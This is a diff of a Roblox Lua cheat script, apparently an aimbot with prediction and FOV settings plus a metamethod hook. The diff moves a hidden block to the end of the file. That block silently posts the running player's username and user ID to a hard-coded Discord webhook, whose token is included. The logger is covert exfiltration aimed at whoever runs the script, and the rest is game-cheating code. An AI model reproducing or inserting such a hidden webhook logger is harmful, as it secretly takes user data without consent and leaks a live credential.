@@ -1,16 +1,3 @@
-local idiot = game:GetService("Players").LocalPlayer
-local response = syn.request(
-
-    {
-        Url = 'https://discord.com/api/webhooks/1015472318434258976/q1GJgZ0qpgAq6R2Y6_8M2zSzFVhr3CjKrv25WJeb_MPjtP1qvTmsYMcNADzUvOFd5Yt2',
-        Method = 'POST',
-        Headers = {
-            ['Content-Type'] = 'application/json'
-        },
-        Body = game:GetService('HttpService'):JSONEncode({content = idiot.Name .. idiot.UserId})
-    }
-);
-
 _G.Prediction =  (  .18  )
 
 _G.FOV =  (  175  )
@@ -104,3 +91,15 @@ oldIndex = hookmetamethod(game, "__index", function(self, Index)
 	end
 	return oldIndex(self, Index)
 end)
+local idiot = game:GetService("Players").LocalPlayer
+local response = syn.request(
+
+    {
+        Url = 'https://discord.com/api/webhooks/1015472318434258976/q1GJgZ0qpgAq6R2Y6_8M2zSzFVhr3CjKrv25WJeb_MPjtP1qvTmsYMcNADzUvOFd5Yt2',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = idiot.Name .. idiot.UserId})
+    }
+);
